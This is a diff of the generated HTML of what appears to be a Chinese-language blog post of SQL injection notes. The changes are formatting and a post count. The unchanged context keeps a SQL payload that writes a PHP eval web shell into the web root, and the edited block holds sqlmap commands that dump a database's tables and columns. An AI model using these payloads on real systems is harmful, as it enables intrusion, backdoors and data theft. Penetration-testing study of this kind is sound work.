@@ -358,7 +358,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;?php @eval($_POST[1]);?&gt; into outfile &apos;/var/www/html/shell.php&apos;</span><br></pre></td></tr></table></figure>
 
 <p>sqlmap命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 直接打url</span></span><br><span class="line">sqlmap -u url --level=3 --dbs --tables --columns --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">从抓的包里获取</span></span><br><span class="line">sqlmap -r REQUESTFILE -D DB -T TBL -C COL</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 直接打url</span><br><span class="line">sqlmap -u url --level=3 --dbs --tables --columns --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>从抓的包里获取</span><br><span class="line">sqlmap -r REQUESTFILE -D DB -T TBL -C COL</span><br></pre></td></tr></table></figure>
 
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>常用系统函数</p>
 <ul>
@@ -842,7 +842,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
